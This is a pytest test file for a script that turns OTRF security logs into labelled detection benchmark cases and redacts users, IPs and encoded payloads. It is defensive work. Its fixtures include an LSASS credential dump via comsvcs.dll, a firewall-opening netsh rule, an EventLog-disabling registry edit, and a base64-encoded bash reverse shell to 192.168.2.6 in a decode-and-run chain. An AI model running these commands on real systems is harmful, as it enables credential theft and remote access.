# Copyright 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: Apache-2.0

from __future__ import annotations

import importlib.util
import json
from collections import Counter
from pathlib import Path

import pytest

SCRIPT = Path(__file__).with_name("benchmark_normalize_otrf_security.py")
SPEC = importlib.util.spec_from_file_location("benchmark_normalize_otrf_security", SCRIPT)
assert SPEC and SPEC.loader
MODULE = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(MODULE)


def win_event(event_id: int, **values: object) -> dict[str, object]:
    return {"EventID": event_id, "Hostname": "LAB-HOST", "TimeCreated": "2026-01-02T03:04:05Z", **values}


def test_exact_exit_requires_unique_same_process_success() -> None:
    start = win_event(4688, NewProcessId="0x2a", CommandLine="example")
    good = win_event(4689, TimeCreated="2026-01-02T03:04:06Z", ProcessId="0x2A", Status="0x0")
    wrong_process = win_event(4689, TimeCreated="2026-01-02T03:04:06Z", ProcessId="0x2b", Status="0x0")
    failed = win_event(4689, TimeCreated="2026-01-02T03:04:06Z", ProcessId="0x2a", Status="0x1")
    assert MODULE.exact_exit(start, [wrong_process, failed, good])
    assert not MODULE.exact_exit(start, [good, dict(good)])
    assert not MODULE.exact_exit(start, [failed])


def test_registry_effect_requires_same_decimal_pid_and_exact_value() -> None:
    start = win_event(4688, NewProcessId="0xa5c", CommandLine="reg add ...")
    effect = win_event(
        13,
        TimeCreated="2026-01-02T03:04:12Z",
        ProcessId="2652",
        TargetObject=r"HKLM\System\CurrentControlSet\Services\EventLog\Start",
        Details="DWORD (0x00000004)",
    )
    assert MODULE.exact_registry_effect(start, [effect])
    assert not MODULE.exact_registry_effect(start, [dict(effect, ProcessId="2653")])
    assert not MODULE.exact_registry_effect(start, [dict(effect, Details="DWORD (0x00000002)")])


def test_firewall_effect_requires_rule_identity_and_successful_exit() -> None:
    start = win_event(
        4688,
        NewProcessId="0x10",
        CommandLine='netsh advfirewall firewall add rule name="test rule" action=allow dir=in',
    )
    effect = win_event(4946, TimeCreated="2026-01-02T03:04:06Z", RuleName="TEST RULE")
    exit_event = win_event(4689, TimeCreated="2026-01-02T03:04:07Z", ProcessId="0x10", Status="0")
    assert MODULE.exact_firewall_effect(start, [effect, exit_event])
    assert not MODULE.exact_firewall_effect(start, [dict(effect, RuleName="other"), exit_event])
    assert not MODULE.exact_firewall_effect(start, [effect, dict(exit_event, Status="1")])


def test_successful_opaque_lsass_dump_and_firewall_change_stay_contextual() -> None:
    lsass = win_event(
        4688,
        NewProcessId="0x10",
        CommandLine=r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Temp\x.dmp full",
    )
    exit_event = win_event(4689, TimeCreated="2026-01-02T03:04:07Z", ProcessId="0x10", Status="0")
    lsass_spec = next(item for item in MODULE.ARCHIVES if item.key == "windows-lsass-comsvcs")
    data = b"".join((json.dumps(row) + "\n").encode() for row in [lsass, exit_event])
    cases = MODULE.normalize_windows(lsass_spec, data, Counter())
    assert len(cases) == 1
    assert cases[0]["truth"]["applicability"] == "out_of_scope"

    firewall = win_event(
        4688,
        NewProcessId="0x20",
        CommandLine='netsh advfirewall firewall add rule name="test rule" action=allow dir=in',
    )
    firewall_effect = win_event(4946, TimeCreated="2026-01-02T03:04:06Z", RuleName="TEST RULE")
    firewall_exit = win_event(4689, TimeCreated="2026-01-02T03:04:07Z", ProcessId="0x20", Status="0")
    firewall_spec = next(item for item in MODULE.ARCHIVES if item.key == "windows-firewall-open")
    data = b"".join(
        (json.dumps(row) + "\n").encode() for row in [firewall, firewall_effect, firewall_exit]
    )
    cases = MODULE.normalize_windows(firewall_spec, data, Counter())
    assert len(cases) == 1
    assert cases[0]["truth"]["applicability"] == "out_of_scope"


def test_detector_payload_redacts_hosts_users_and_encoded_payloads() -> None:
    raw = (
        r'bash -c C:\Users\alice\x 192.168.2.6 T1003 name="atomic testing" '
        "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi80NDMgMD4mMQo="
    )
    cleaned = MODULE.clean_command(raw)
    assert "alice" not in cleaned
    assert "192.168.2.6" not in cleaned
    assert "YmFza" not in cleaned
    assert "T1003" not in cleaned
    assert "atomic testing" not in cleaned
    assert "<user>" in cleaned and "<ipv4>" in cleaned and "<encoded-payload>" in cleaned


def test_dd_success_remains_contextual_without_redirection() -> None:
    data = b"\n".join(
        [
            b"type=SYSCALL msg=audit(1604996384.965:93777): syscall=59 success=yes exit=0 pid=2168",
            b'type=EXECVE msg=audit(1604996384.965:93777): argc=4 a0="dd" a1="if=/dev/zero" a2="bs=1" a3="count=1"',
        ]
    )
    spec = next(item for item in MODULE.ARCHIVES if item.key == "linux-dd-padding")
    cases = MODULE.normalize_linux_audit(spec, data, Counter())
    assert len(cases) == 1
    assert cases[0]["truth"]["applicability"] == "out_of_scope"
    assert cases[0]["truth"]["source_truth"] == "malicious"


def test_auoms_parent_child_chain_is_bounded_and_redacted() -> None:
    encoded = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi80NDMgMD4mMQo="
    rows = [
        {
            "SyslogMessage": (
                "type=AUOMS_EXECVE audit(1652292621.986:84138): success=yes exit=0 ppid=1340 pid=17790 "
                f'comm="bash" cmdline="bash -c "{{echo,{encoded}}}|{{base64,-d}}|{{bash,-i}}"" redactors='
            )
        },
        {
            "SyslogMessage": (
                "type=AUOMS_EXECVE audit(1652292622.006:84144): success=yes exit=0 ppid=17790 pid=17794 "
                'comm="bash" cmdline="bash -i" redactors='
            )
        },
    ]
    data = b"".join((json.dumps(row) + "\n").encode() for row in rows)
    spec = next(item for item in MODULE.ARCHIVES if item.key == "linux-log4shell-chain")
    cases = MODULE.normalize_auoms(spec, data, Counter())
    assert len(cases) == 1
    assert cases[0]["surface"] == "stateful"
    assert len(cases[0]["payload"]["events"]) == 2
    assert encoded not in MODULE.canonical_json(cases[0]["payload"])
    assert cases[0]["truth"]["applicability"] == "out_of_scope"


def test_deduplication_excludes_label_conflicts() -> None:
    spec = MODULE.ARCHIVES[0]
    payload = MODULE.action_payload("echo test", "cmd")
    positive = MODULE.make_case(spec, 0, payload, MODULE.malicious_truth("proof"))
    duplicate = MODULE.make_case(spec, 1, payload, MODULE.malicious_truth("proof"))
    stats = Counter()
    assert len(MODULE.deduplicate([positive, duplicate], stats)) == 1
    assert stats["exact_payload_duplicates_removed"] == 1
    conflicting = MODULE.make_case(spec, 2, payload, MODULE.contextual_truth("ambiguous"))
    stats = Counter()
    assert MODULE.deduplicate([positive, conflicting], stats) == []
    assert stats["label_conflicts_excluded"] == 2


def test_pinned_revision_is_enforced(tmp_path: Path) -> None:
    with pytest.raises(ValueError, match="pinned source revision"):
        MODULE.normalize_directory(tmp_path, "main")


def test_real_selective_projection_validates() -> None:
    source = Path("/tmp/otrf-security-selective/repo")
    if not source.exists():
        pytest.skip("selective OTRF source is not present")
    cases, manifest = MODULE.normalize_directory(source, MODULE.SOURCE_REVISION)
    MODULE.validate_cases(cases)
    assert manifest["cases"] == len(cases)
    assert manifest["datasets"] == [MODULE.DATASET]
    assert set(manifest) == {
        "schema_version",
        "datasets",
        "cases",
        "counts",
        "exact_payload_duplicates_removed",
        "label_conflicts_excluded",
        "adapter_statistics",
        "output_sha256",
    }
    assert any(case["surface"] == "stateful" for case in cases)
    assert all(len(case["payload"].get("events", [])) <= MODULE.MAX_EVENTS for case in cases)
